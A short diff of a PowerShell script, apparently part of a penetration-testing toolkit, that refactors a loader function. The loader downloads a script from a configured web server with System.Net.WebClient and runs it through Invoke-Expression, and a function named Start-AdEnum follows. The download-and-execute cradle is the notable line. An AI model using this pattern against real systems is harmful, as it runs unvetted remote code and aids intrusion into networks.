@@ -123,7 +123,8 @@
             [string]$Serverroot = $Global:WebServerRoot
         )
     
-        Invoke-Expression (New-Object System.Net.Webclient).DownloadString("$($Serverroot + $item)")
+        $script = (New-Object System.Net.Webclient).DownloadString("$($Serverroot + $item)")
+        Invoke-Expression $script
     }
     
     function Global:Start-AdEnum {
